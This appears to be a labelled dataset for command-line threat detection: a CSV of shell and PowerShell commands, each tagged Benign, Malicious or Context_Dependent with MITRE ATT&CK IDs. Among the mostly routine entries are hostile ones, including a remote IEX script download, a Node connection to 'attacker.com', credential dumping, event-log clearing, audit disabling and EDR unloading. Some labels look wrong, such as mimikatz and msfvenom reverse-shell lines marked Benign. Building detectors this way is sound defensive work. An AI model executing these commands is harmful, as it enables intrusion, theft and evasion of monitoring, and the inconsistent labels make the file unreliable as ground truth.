command,label,original_label,mitre_id
chgrp group path/to/file_or_directory,Benign,Benign,Benign
mkdir tata,Benign,Benign,Benign
tart ip vm-name,Benign,Benign,Benign
"dolt commit [-m|--message] ""commit_message""",Benign,Benign,Benign
find -mmin -60,Benign,Benign,Benign
xdelta3 -d -s path/to/old_file path/to/patch_file path/to/new_file,Benign,Benign,Benign
mozillavpn login,Benign,Benign,Benign
msgattrib --untranslated input.po > untranslated.po,Benign,Benign,Benign
write-warning $cred.GetNetworkCredential().Password,Malicious,Malicious,T1056
unsquashfs [-l|-ls] filesystem.squashfs,Benign,Benign,Benign
cal -m,Benign,Benign,Benign
file $(which perl 2>/dev/null),Context_Dependent,Synthetic,Synthetic
systemd-mount --automount yes path/to/file_or_device,Benign,Benign,Benign
pi --help,Benign,Benign,Benign
qsub -q queue_name script.sh,Benign,Benign,Benign
cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*,Malicious,Malicious,T1567
cli4 /user,Benign,Benign,Benign
raku -c path/to/script.raku,Benign,Benign,Benign
sudo dkms install -m acpi_call -v 1.2.1,Benign,Benign,Benign
ip [m|maddress] [s|show] dev ethX,Benign,Benign,Benign
haxelib search keyword,Benign,Benign,Benign
tldr ykman openpgp,Benign,Benign,Benign
pw-mididump path/to/file.mid,Benign,Benign,Benign
swaplabel [-L|--label] new_label path/to/file,Benign,Benign,Benign
fping [-a|--alive] [-g|--generate] 192.168.1.0/24,Benign,Benign,Benign
"tac filename | awk '{for (i=NF; i>1; i--) printf(""%s "",$i); printf(""%s\n"",$1)}'",Benign,Benign,Benign
find . -name '*.[ch]' | xargs grep -E 'expr',Benign,Benign,Benign
"[ ""$(uname)"" = 'FreeBSD' ] && /bin/echo ""#\!/bin/sh"" > ""testdirwithspaceend /init "" && echo 'echo ""print(\""running T1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend /init "" && echo ""exit"" >> ""testdirwithspaceend /init "" || /usr/bin/echo -e ""%d\na\n#!/usr/bin/perl\nprint \""running T1035.006 with space after filename to masquerade init\\n\"";\nqx/cp \/usr\/bin\/perl 'init '/;\nqx/'.\/init ' -e 'sleep 5'/;\n.\nwq\n"" | ed 'testdirwithspaceend /init ' >/dev/null",Malicious,Malicious,T1036
"find -maxdepth 1 -name '*.sql' -exec sed -e 's/ , );/1,1);/g' '{}' | mysql -D ootp",Benign,Benign,Benign
pg_walsummary path/to/file,Benign,Benign,Benign
CallWindowProc,Malicious,Malicious,T1106
rabbitmqctl set_permissions [-p|--vhost] vhost_name username read write configure,Benign,Benign,Benign
gpg [--full-gen-key|--full-generate-key],Benign,Benign,Benign
shopt nullglob,Benign,Benign,Benign
eza --git-ignore,Benign,Benign,Benign
"echo ""import subprocess; subprocess.Popen(['open', '-a', '$exe_name'])"" > ""$SITE_PACKAGES/atomic_hook.pth""",Malicious,Malicious,T1546
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f",Malicious,Malicious,T1112
~/.bashrc,Malicious,Malicious,T1156
Get-DedupProperties -FileSystemLabel 'Label',Benign,Benign,Benign
sudo semanage boolean [-m|--modify] -1|--on|-0|--off haproxy_connect_any,Benign,Benign,Benign
pushd -n +4,Benign,Benign,Benign
sendmail < message.txt -f sender@example.com receiver@example.com,Benign,Benign,Benign
ntpctl -s [p|peers],Benign,Benign,Benign
choco source list,Benign,Benign,Benign
conda compare file.yml,Benign,Benign,Benign
pwsh -NoExit,Benign,Benign,Benign
dolt status,Benign,Benign,Benign
dalfox url https://example.com [-H|--header] 'X-My-Header: 123',Benign,Benign,Benign
command | more,Benign,Benign,Benign
find \( -name '*.cpp' -o -name '*.h' \) -print,Benign,Benign,Benign
i2cget i2cbus device_address register_address,Benign,Benign,Benign
rpcclient $> createdomuser username,Benign,Benign,Benign
"pnmconvol -matrixfile path/to/matrix1,path/to/matrix2,... path/to/image.pnm > path/to/output.pnm",Benign,Benign,Benign
%SYSTEM32%,Malicious,Malicious,T1055
tldr jira project,Benign,Benign,Benign
aws sso logout,Benign,Benign,Benign
--init,Malicious,Malicious,T1036
"copy ""$service_executable"" ""C:\Program Files\windows_service.exe""",Malicious,Malicious,T1574
tldr flock,Benign,Benign,Benign
gt modify -cam commit_message,Benign,Benign,Benign
diff -u file1 file2,Benign,Benign,Benign
which [-a|--all] executable,Context_Dependent,Benign,Benign
userdbctl user username,Benign,Benign,Benign
arithmetic -r 7,Benign,Benign,Benign
gedit path/to/file,Benign,Benign,Benign
dumpe2fs -h /dev/sdXN,Benign,Benign,Benign
"Set-Volume -FileSystemLabel ""OldLabel"" -NewFileSystemLabel ""NewLabel""",Benign,Benign,Benign
dotnet ef migrations add name,Benign,Benign,Benign
pmap pid,Benign,Benign,Benign
bfs path/to/directory -path '**/path/**/*.ext' -or -name '*pattern*',Benign,Benign,Benign
usql [-f|--file] path/to/query.sql,Benign,Benign,Benign
koji untag-build tag pkg1 pkg2 ... --all,Benign,Benign,Benign
brittany path/to/file.hs,Benign,Benign,Benign
jira issue create [-P|--parent] parent,Benign,Benign,Benign
"find . -type d -exec chmod u=rwx,g=rx,o= '{}' \;",Benign,Benign,Benign
ipsumdump --src --dst --length --anonymize path/to/file.pcap,Benign,Benign,Benign
replace path\to\file_or_directory path\to\destination_directory,Benign,Benign,Benign
$handle | get-member -erroraction silentlycontinue | out-file $output_file -append,Context_Dependent,Malicious,T1012
parquet-tools column-index path/to/parquet,Benign,Benign,Benign
find . -type f -empty | wc -l,Benign,Benign,Benign
distcc gcc -c path/to/source.c -o path/to/output.o,Benign,Benign,Benign
limactl shell vm_name,Benign,Benign,Benign
tldr musescore,Benign,Benign,Benign
"$sheet.Cells.Item(18,1) = ""=FWRITELN(A5, `""End If`"")""",Malicious,Malicious,T1204
"find . -iname ""*linkin park*""",Benign,Benign,Benign
wami --list-topics search_string,Benign,Benign,Benign
nvm install-latest-npm,Benign,Benign,Benign
valac --help,Benign,Benign,Benign
systeminfo /?,Benign,Benign,Benign
pikman [r|remove] package,Benign,Benign,Benign
glab mr merge [-d|--remove-source-branch],Benign,Benign,Benign
input keyevent event_code,Benign,Benign,Benign
Register-cimprovider -path {PATH_ABSOLUTE:.dll},Malicious,Malicious,T1218
aplay path/to/file,Benign,Benign,Benign
time command,Benign,Benign,Benign
nc host port > received_filename,Context_Dependent,Benign,Benign
rev file.txt | cut -d ' ' -f1 | rev,Benign,Benign,Benign
treetime clock,Benign,Benign,Benign
chars 10,Benign,Benign,Benign
fvm releases,Benign,Benign,Benign
find . -follow -inum 41525360,Benign,Benign,Benign
mktemp -t identifier.XXXXXXXXXX,Benign,Benign,Benign
"find . -type f -and -iname ""*.deb""",Benign,Benign,Benign
elasticsearch-reset-password --url host:port [-u|--username] user [-i|--interactive],Benign,Benign,Benign
"Write-Host ""[i] Base IP-Address for Subnet: $ipAddr""",Context_Dependent,Malicious,T1046
lolcat [-F|--frequency] number path/to/file,Benign,Benign,Benign
zipsplit path/to/archive.zip,Benign,Benign,Benign
"find . -type f -noleaf -links +1 -printf ""%n %i %f\t%h\n"" | sort | less",Benign,Benign,Benign
Invoke-PowerDump,Malicious,Malicious,T1003
openclaw onboard [-h|--help],Benign,Benign,Benign
pacstall [-L|--list],Benign,Benign,Benign
"find /usr/local -name ""*blast*""",Benign,Benign,Benign
"mimikatz ""token::elevate""",Benign,Benign,Benign
"find /var -type f -exec grep ""param1"" {} \; -print",Benign,Benign,Benign
git push --prune remote_name,Benign,Benign,Benign
find ~/ -name 'core*' -exec rm {} \,Benign,Benign,Benign
find trunk -type f -exec curl --user user:pass --ftp-create-dirs -T {} https://PATH_TO_NEXUS/{} \;,Benign,Benign,Benign
resume torrent_id,Benign,Benign,Benign
tmsu tag path/to/file.mp3 music big-jazz mp3,Benign,Benign,Benign
opencode uninstall [-f|--force],Benign,Benign,Benign
cat $filename | rev | cut -c 3- | rev,Benign,Benign,Benign
podman images,Benign,Benign,Benign
systemd-socket-activate path/to/socket.service [-l|--listen] 8080,Benign,Benign,Benign
aws acm-pca create-certificate-authority --certificate-authority-configuration ca_config --idempotency-token token --permanent-deletion-time-in-days number,Benign,Benign,Benign
heroku ps --app app_name,Benign,Benign,Benign
awk -F '\t' '{print $2}' * | sort | uniq -c | sort -nr,Benign,Benign,Benign
inkscape path/to/file.svg [-o|--export-filename] path/to/file.png [-D|--export-area-drawing],Benign,Benign,Benign
pdfcrop path/to/input_file.pdf --resolution 72 path/to/output_file.pdf,Benign,Benign,Benign
cat /etc/passwd |grep nobody,Malicious,Malicious,T1078
scd -v,Benign,Benign,Benign
mpstat 2 5,Benign,Benign,Benign
wlc [-c|--config] path/to/file list-projects,Benign,Benign,Benign
"yes a=\""20131202\"" | sed -e :a -e 's/...\([0-9]\{4\}\)\([0-9]\{2\}\)\([0-9]\{2\}\)./\1 \2 \3/'",Benign,Benign,Benign
hub push remote_name && hub pull-request,Benign,Benign,Benign
"luajit -e 'print(""Hello World"")'",Benign,Benign,Benign
r2e list,Benign,Benign,Benign
chown -R www-data /var/www/.gnome2 /var/www/.config /var/www/.config/inkscape,Benign,Benign,Benign
lpstat -d,Benign,Benign,Benign
ksh,Benign,Benign,Benign
logsave -a logfile command,Benign,Benign,Benign
tokei path/to/directory [-e|--exclude] *.min.js,Benign,Benign,Benign
gst-launch-1.0 [-e|--eos-on-shutdown] videotestsrc ! x264enc ! element_name. audiotestsrc ! opusenc ! element_name. matroskamux name=element_name ! filesink location=path/to/file.mkv,Benign,Benign,Benign
godot [-s|--script] script.gd,Benign,Benign,Benign
systemd-dissect --attach path/to/image.raw,Benign,Benign,Benign
nvidia-smi,Benign,Benign,Benign
i3-msg command,Benign,Benign,Benign
sudo lxc-stop container_name,Benign,Benign,Benign
isosize [-x|--sectors] path/to/file.iso,Benign,Benign,Benign
kopia policy set --global --add-ignore path/to/file_or_folder,Benign,Benign,Benign
pest --coverage --min=80,Benign,Benign,Benign
nagios4 -s,Benign,Benign,Benign
gcloud iam service-accounts keys list --iam-account service_account_email,Benign,Benign,Benign
steamos-session-select plasma-wayland-persistent,Benign,Benign,Benign
LastWriteTime,Malicious,Malicious,T1070
grant action_list on object_type object_name to role role_name;,Benign,Benign,Benign
wondershaper -a adapter_name -d 1024,Benign,Benign,Benign
VirtualFree,Malicious,Malicious,T1106
Get-NodeVersions -Remote,Benign,Benign,Benign
prctl pid,Benign,Benign,Benign
sshare --parsable|parsable2|json|yaml,Benign,Benign,Benign
chmod +x pretty-print,Benign,Benign,Benign
$(dirname $(readlink -e ../../../../etc/passwd)),Benign,Benign,Benign
grep -c '' /etc/passwd,Context_Dependent,Synthetic,Synthetic
chkconfig --level 2345 sshd on,Benign,Benign,Benign
systemd-cryptsetup detach mapping_name,Benign,Benign,Benign
virtualenv --prompt prompt_prefix path/to/venv,Benign,Benign,Benign
tdf [-f|--fullscreen] path/to/file.pdf,Benign,Benign,Benign
readlink -f $(which java),Benign,Benign,Benign
lpoptions -d printer -o option,Benign,Benign,Benign
plasma-apply-lookandfeel --list,Benign,Benign,Benign
wc [-L|--max-line-length] path/to/file,Benign,Benign,Benign
head -20 /etc/hostname,Context_Dependent,Synthetic,Synthetic
dsenableroot -u art-tester -p art-tester -r art-root #new user,Malicious,Malicious,T1078
dark-mode on,Benign,Benign,Benign
magick montage path/to/image1.jpg path/to/image2.jpg ... path/to/montage.jpg,Benign,Benign,Benign
ulimit -a,Context_Dependent,Synthetic,Synthetic
Stop-Service -Name service_name -Force -Confirm,Benign,Benign,Benign
nettacker --show-all-modules,Benign,Benign,Benign
dbus-daemon --syslog,Benign,Benign,Benign
gofmt -s -w source.go,Benign,Benign,Benign
find file -chour +1 -exit 0 -o -exit 1,Benign,Benign,Benign
bspc node [-t|--state] ~fullscreen,Benign,Benign,Benign
hledger print assets:cash | hledger [-f|--file] - [-I|--ignore-assertions] aregister expenses:food,Benign,Benign,Benign
ifdata -e eth0,Benign,Benign,Benign
Add-AppxPackage -Path path\to\package.msix -DependencyPath path\to\dependencies.msix -AllowUnsigned,Benign,Benign,Benign
"require(""net"").connect(12345, ""attacker.com"", function () {",Malicious,Malicious,T1059
pio settings get setting,Benign,Benign,Benign
sleep `10`,Benign,Benign,Benign
"openclaw agent [-m|--message] ""Ship checklist""",Benign,Benign,Benign
pamfix [-cl|-clip] path/to/corrupted.ext > path/to/output.ext,Benign,Benign,Benign
sbt -sbt-jar path,Benign,Benign,Benign
mcfly help subcommand,Benign,Benign,Benign
"Scriptrunner.exe -appvscript ""$payload_path""",Malicious,Malicious,T1202
wacaw --to-clipboard,Benign,Benign,Benign
clang-tidy path/to/file.cpp,Benign,Benign,Benign
sudo termshark interface,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:80 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
debugfs,Malicious,Malicious,T1059
find . -name '*.JUKEBOX.*.txt' -maxdepth 1 -print0 | xargs -0 -IFILE mv FILE ./JUKEBOX,Benign,Benign,Benign
duplicacy list,Benign,Benign,Benign
w | awk '{print $1}' | xargs -I '{}' id '{}',Context_Dependent,Benign,Benign
stylua - < path/to/file.lua,Benign,Benign,Benign
prowler aws [-p|--profile] custom-profile [-f|--filter-region] us-east-1 eu-south-2 ...,Benign,Benign,Benign
go run path/to/file.go,Benign,Benign,Benign
git show-branch branch_name1|ref1|commit1 branch_name2|ref2|commit2 ...,Benign,Benign,Benign
tftp server_ip -c command,Benign,Benign,Benign
picom &,Benign,Benign,Benign
sudo partx [-a|--add] [-v|--verbose] path/to/device_or_disk_image,Benign,Benign,Benign
tldr distrobox-export,Benign,Benign,Benign
bchunk path/to/image.bin path/to/image.cue path/to/output,Benign,Benign,Benign
crontab -l -u nobody,Context_Dependent,Synthetic,Synthetic
meld path/to/file_1 path/to/file_2,Benign,Benign,Benign
molecule matrix converge,Benign,Benign,Benign
lsb_release -a,Context_Dependent,Synthetic,Synthetic
"source ""$file""",Benign,Benign,Benign
nodenv install version,Benign,Benign,Benign
dub init project_name [-n|--non-interactive],Benign,Benign,Benign
stat /etc/bashrc,Context_Dependent,Synthetic,Synthetic
mate-screenshot --window,Benign,Benign,Benign
systemctl whoami pid1 pid2 ...,Benign,Benign,Benign
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath"" /t REG_EXPAND_SZ /d ""%systemroot%\system32\notepad.exe"" /f",Malicious,Malicious,T1112
auditpol /set /category:”Account Logon” /success:disable /failure:disable,Malicious,Malicious,T1562
"eyeD3 [-A|--album] ""Album Name"" *.mp3",Benign,Benign,Benign
hostess del local.example.com,Benign,Benign,Benign
starship init bash|elvish|fish|ion|powershell|tcsh|zsh,Benign,Benign,Benign
pkgstats [-h|--help],Benign,Benign,Benign
mkosi help,Benign,Benign,Benign
php-cs-fixer list-files,Benign,Benign,Benign
lrztar path/to/directory,Benign,Benign,Benign
"find . -name ""*.pdf"" -exec rm {} \;",Benign,Benign,Benign
attrib.exe +h $file_or_folder\T1222.001_attrib2.txt,Malicious,Malicious,T1222
pio team update --description new_description organization_name:team_name,Benign,Benign,Benign
Filter = [Ref] $Filter;,Malicious,Malicious,T1546
behat --definitions,Benign,Benign,Benign
DumpNTLMInfo.py -port port target,Benign,Benign,Benign
"find ${FOLDER} -type f ! -name \"".*\"" -mtime -${RETENTION}",Benign,Benign,Benign
sudo lxc-attach container_name,Benign,Benign,Benign
ghcid --run=action path/to/Main.hs,Benign,Benign,Benign
zeroclaw daemon,Benign,Benign,Benign
find . -name '*-GHBAG-*' -exec rename 's/GHBAG/stream-agg/' {} +,Benign,Benign,Benign
sudo perf report,Benign,Benign,Benign
znew -K path/to/file1.Z,Benign,Benign,Benign
icacls . /grant Everyone:F /T /C /Q,Malicious,Malicious,T1222
loft vars username,Benign,Benign,Benign
nmcli device show,Context_Dependent,Synthetic,Synthetic
tmuxinator edit project,Benign,Benign,Benign
cpuid [-r|--raw],Benign,Benign,Benign
gpgconf [-L|--list-dirs],Benign,Benign,Benign
kdenlive --mlt-log verbose|debug,Benign,Benign,Benign
bzip2 -t file.bz2,Benign,Benign,Benign
gummy [-s|--screen] 1 [-t|--temperature] 3800 [-b|--brightness] 65,Benign,Benign,Benign
k6 run script.js,Benign,Benign,Benign
nmap $host_to_scan,Context_Dependent,Malicious,T1046
tail -20 /etc/hosts,Context_Dependent,Synthetic,Synthetic
ctest --output-on-failure [-R|--tests-regex] '^test_name$',Benign,Benign,Benign
pstree -p,Context_Dependent,Synthetic,Synthetic
mssqlclient.py -k domain/username@target,Benign,Benign,Benign
systemctl add-wants target unit1 unit2 ...,Benign,Benign,Benign
wireplumber --version,Benign,Benign,Benign
yay package_name|search_term,Benign,Benign,Benign
poetry env list --full-path,Benign,Benign,Benign
mocha [-R|--reporter] reporter,Benign,Benign,Benign
"find . -type f -iname ""*.jpg"" -ls | awk 'BEGIN {print ""0""}; {print $7, ""+""}; END {print ""p""}' | dc",Benign,Benign,Benign
searchsploit --nmap path/to/nmap-output.xml,Benign,Benign,Benign
makoctl invoke,Benign,Benign,Benign
apx pkgmanagers list,Benign,Benign,Benign
find /apps -group accts -print,Benign,Benign,Benign
debsecan --suite release_code_name,Benign,Benign,Benign
"qr ""data""",Benign,Benign,Benign
find /etc -type f -print | xargs grep -il old1\.old2\.co\.com,Benign,Benign,Benign
find / -mtime +50 -mtime -100 | head,Context_Dependent,Benign,Benign
waitress-serve --threads=4 import.path:wsgifunc,Benign,Benign,Benign
zcat bigfile.z | tail -n +500 | head -501,Benign,Benign,Benign
"import-module ""$file_path\timestomp.ps1""",Malicious,Malicious,T1070
p4 submit -c changelist_number,Benign,Benign,Benign
gmssl zuc -e -in path/to/file -out path/to/file.zuc,Benign,Benign,Benign
find data/ -name filepattern-*2009* -print > filesOfInterest.txt,Benign,Benign,Benign
"repomix --include ""src/**/*.ts"" --ignore ""**/*.test.ts""",Benign,Benign,Benign
"Resolve-Path -Path ""\\hostname\path\to\file""",Benign,Benign,Benign
az disk update [-g|--resource-group] resource_group [-n|--name] disk_name [-z|--size-gb] new_size_in_gb,Benign,Benign,Benign
"mosquitto_pub [-h|--host] 192.168.1.1 [-p|--port] 1885 [-t|--topic] sensors/temperature [-m|--message] ""1266193804 32""",Benign,Benign,Benign
xml [el|elements] -a path/to/input.xml|URI > path/to/elements.xpath,Benign,Benign,Benign
FAX,Context_Dependent,Malicious,T1007
vercel [-b|--build-env] ENV=var,Benign,Benign,Benign
mokutil [-N|--list-new],Benign,Benign,Benign
"echo ""( `date -d $B +%s` - `date -d $A +%s`) / (24*3600)"" | bc -l",Benign,Benign,Benign
transcode -Z 640x480 -i input_file -y xvid -o output_file,Benign,Benign,Benign
nu --log-level error|warn|info|debug|trace path/to/script.nu,Benign,Benign,Benign
./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule,Malicious,Malicious,T1562
GetADUsers.py -all -dc-ip domain_controller_ip domain/username:password,Benign,Benign,Benign
reportbug other,Benign,Benign,Benign
"find / -user edwarda -exec rm ""{}"" \;",Benign,Benign,Benign
httping -g url,Benign,Benign,Benign
pkgin search keyword,Benign,Benign,Benign
simplehttpserver -verbose,Benign,Benign,Benign
"csvtool [-c|--column] 2,4 path/to/file.csv",Benign,Benign,Benign
pwd | cut -f 1- -d\/ --output-delimiter=$'\n',Benign,Benign,Benign
htop --readonly,Benign,Benign,Benign
"sudo find /var/log -name ""$system_log_name2*"" -exec shred -u -z -n 3 {} \; #using ""shred"" execution",Malicious,Malicious,T1070
takeown /r /d path\to\directory,Benign,Benign,Benign
"exif --ifd 0 [-t|--tag] ""Model"" [-m|--machine-readable] path/to/image.jpg",Benign,Benign,Benign
hledger [bs|balancesheet] [-M|--monthly],Benign,Benign,Benign
systemd-cgtop [-d|--delay] interval,Benign,Benign,Benign
security-checker security:check,Benign,Benign,Benign
fdupes [-rdN|--recurse --delete --noprompt] path/to/directory,Benign,Benign,Benign
"if (-not (Test-Path -Path""$env:TEMP\t1003.001-13-rdrleakdiag"")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force}",Malicious,Malicious,T1003
pveum [u|user] [a|add] username@pve --email email_address --comment description --password password,Benign,Benign,Benign
prowler gcp [-s|--services] iam|compute|...,Benign,Benign,Benign
ghc -e expression,Benign,Benign,Benign
abrt-action-analyze-backtrace -v,Benign,Benign,Benign
"alembic revision --autogenerate -m ""message""",Benign,Benign,Benign
find dir1 ! -type d |xargs wc -c |tail -1,Benign,Benign,Benign
sysctl -a 2>/dev/null | wc -l,Context_Dependent,Synthetic,Synthetic
fc --help,Benign,Benign,Benign
gh browse [-s|--settings],Benign,Benign,Benign
who -a,Context_Dependent,Synthetic,Synthetic
"mail --subject ""subject line"" to_user@example.com --cc ""cc_email_address""",Benign,Benign,Benign
sudo chown -R `whoami` /usr/local/lib,Benign,Benign,Benign
kubectx name,Benign,Benign,Benign
C:\\Windows\\Temp\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK,Malicious,Malicious,T1074
react-native run-android --variant=release,Benign,Benign,Benign
dnsmasq --no-daemon,Benign,Benign,Benign
ark [-b|--batch] [-o|--destination] path/to/directory path/to/archive,Benign,Benign,Benign
basename $(pwd),Benign,Benign,Benign
npm doctor connection,Benign,Benign,Benign
gcalcli agenda,Benign,Benign,Benign
amass intel|enum -help,Benign,Benign,Benign
"sudo socat OPENSSL-LISTEN:4433,reuseaddr,cert=./cert.pem,cafile=./ca.cert.pem,key=./key.pem,verify=0 STDOUT",Benign,Benign,Benign
pre-commit clean,Benign,Benign,Benign
sudo trace-cmd record --max-graph-depth depth,Benign,Benign,Benign
"New-Item -Path ""HKCU:\Software\Classes\CLSID\$clsid_guid\InprocServer32"" -Value ""$file_name"" -Force | Out-Null",Malicious,Malicious,T1574
i3-scrot,Benign,Benign,Benign
find . -name \*.c -print0,Benign,Benign,Benign
ern run-ios|android,Benign,Benign,Benign
basename $0,Benign,Benign,Benign
schroot --all command,Benign,Benign,Benign
ahost -d example.com,Benign,Benign,Benign
ppmhist [-m|-map] path/to/image.ppm,Benign,Benign,Benign
ldc2 -h,Benign,Benign,Benign
renice -n -4 -u uid|user,Benign,Benign,Benign
ocrmypdf path/to/input path/to/output.pdf,Benign,Benign,Benign
source <(gcrane completion bash/zsh),Benign,Benign,Benign
cat /dir/file.txt | wc -l,Benign,Benign,Benign
sudo vgextend vg1 /dev/sda1,Benign,Benign,Benign
jpegtran -crop WxH -outfile path/to/output.jpg path/to/image.jpg,Benign,Benign,Benign
sudo zerotier-cli leave network_id,Benign,Benign,Benign
wevtutil cl security,Malicious,Malicious,T1070
msfvenom [-p|--payload] linux/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=local_port [-f|--format] elf [-o|--out] path/to/binary,Benign,Benign,Benign
gio info path/to/file,Benign,Benign,Benign
find / -name '*.yml' 2>/dev/null | head -20,Context_Dependent,Synthetic,Synthetic
ppmntsc --pal path/to/input_file.ppm > path/to/output_file.ppm,Benign,Benign,Benign
ppmcie -red|green|blue xpos ypos > path/to/output.ppm,Benign,Benign,Benign
check-language-support [-l|--language] en,Benign,Benign,Benign
kpartx -d whole_disk.img,Benign,Benign,Benign
find -cmin -5 | less -R,Benign,Benign,Benign
lure [in|install] package,Benign,Benign,Benign
cargo metadata --no-deps,Benign,Benign,Benign
"find ""$HOME"" -name '*.txt' -type f -not -path ""$HOME/newdir/*"" -print0 | xargs -0 cp -t ""$HOME/newdir""",Benign,Benign,Benign
else: import urllib as r,Malicious,Malicious,T1105
rcp [-p|--preserve] path/to/local_file username@remote_host:/path/to/destination/,Benign,Benign,Benign
realpath [-e|--canonicalize-existing] path/to/file_or_directory,Benign,Benign,Benign
chsh --shell /bin/bash nobody,Malicious,Malicious,T1078
mate-search-tool --start --named=string --path=path/to/directory --sortby=name|folder|size|type|date,Benign,Benign,Benign
seq 0 20 | xargs -n1 tssh MYBOXES,Benign,Benign,Benign
owut download [-V|--version-to] 25.12.0,Benign,Benign,Benign
sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist,Malicious,Malicious,T1562
androguard axml path/to/app.apk,Benign,Benign,Benign
sudo gitlab-runner unregister --name name,Benign,Benign,Benign
"cd ""$(find . -name Subscription.java -printf '%h\n')""",Benign,Benign,Benign
aws workmail associate-member-to-group --group-id group_id --member-id member_id --organization-id organization_id,Benign,Benign,Benign
stat /etc/profile,Context_Dependent,Synthetic,Synthetic
cat >/path/to/temp-dir/y.py<<EOF,Malicious,Malicious,T1548
espanso edit config,Benign,Benign,Benign
bindkey -l,Benign,Benign,Benign
picom-trans [-n|--name] Firefox [-o|--opacity] percentage,Benign,Benign,Benign
openstack volume set --name volume_new_name --size volume_new_size --attached|--detached --bootable|--non-bootable volume_id,Benign,Benign,Benign
su -c 'chpass -p encrypted_password username',Benign,Benign,Benign
vssadmin list shadows,Malicious,Malicious,T1680
touch path/to/file1 path/to/file2 ...,Benign,Benign,Benign
ss [-4t|--ipv4 --tcp] src 192.168/16,Context_Dependent,Benign,Benign
http https://example.com,Benign,Benign,Benign
octez-client get balance for alias_or_address,Benign,Benign,Benign
"find . -maxdepth 1 -type d -iname ""*linkin park*"" -exec cp -r {} /Users/tommye/Desktop/LP \;",Benign,Benign,Benign
wafw00f [-t|--test] Cloudflare|Cloudfront|Fastly|ZScaler|... https://www.example.com,Benign,Benign,Benign
ctop -h,Benign,Benign,Benign
http-prompt,Benign,Benign,Benign
nix build [-L|--print-build-logs] .#pkg,Benign,Benign,Benign
"blackfire agent --socket=""tcp://127.0.0.1:8307""",Benign,Benign,Benign
chgrp,Benign,Benign,Benign
.json,Malicious,Malicious,T1105
tailscale status,Benign,Benign,Benign
nikto -h http://10.0.0.10,Context_Dependent,Synthetic,Synthetic
HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run,Malicious,Malicious,T1547
lame -V 0 path/to/file.wav path/to/output.mp3,Benign,Benign,Benign
"$PYTHON_EXE -c ""print('Triggering Hook via usercustomize.py...')""",Malicious,Malicious,T1546
find . -type f -exec ls -lrt {} \; |awk -F' ' '{print $9}',Benign,Benign,Benign
vagrant resume name|id --provision-with provisioner,Benign,Benign,Benign
"find . -type f -name "".*""",Benign,Benign,Benign
"echo ""password"" | md5sum",Benign,Benign,Benign
as path/to/file.s -o path/to/output_file.o,Benign,Benign,Benign
"od -a -An -v file | perl -0777ne 's/\n//g,print ""$_\n "" for /(?:esc| fs| gs| us)?(?:(?!esc| fs| gs| us).)*/gs'",Benign,Benign,Benign
whatis keyword1 keyword2,Benign,Benign,Benign
"Powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'""",Malicious,Malicious,T1059
find . -type f -perm 755 | wc -l,Benign,Benign,Benign
DLLRegisterServer,Malicious,Malicious,T1218
jj [b|bookmark] [d|delete] name,Benign,Benign,Benign
"pio test [-f|--filter] ""pattern""",Benign,Benign,Benign
", command -with -flags",Benign,Benign,Benign
now remove deployment_id,Benign,Benign,Benign
aws sqs delete-message --queue-url https://queue_url --receipt-handle receipt_handle,Benign,Benign,Benign
yadm clone remote_repository_location -b branch,Benign,Benign,Benign
megatools-dl --choose-files https://mega.nz/...,Benign,Benign,Benign
netperf address -4|6,Benign,Benign,Benign
find . -type f -exec /tmp/clever.sh {} \;,Benign,Benign,Benign
$PasswordProfile.Password = $password,Malicious,Malicious,T1136
"mkdir Labs/lab4a/{folder1,myfolder,foofolder}",Benign,Benign,Benign
exiqgrep -r 'email@example.com',Benign,Benign,Benign
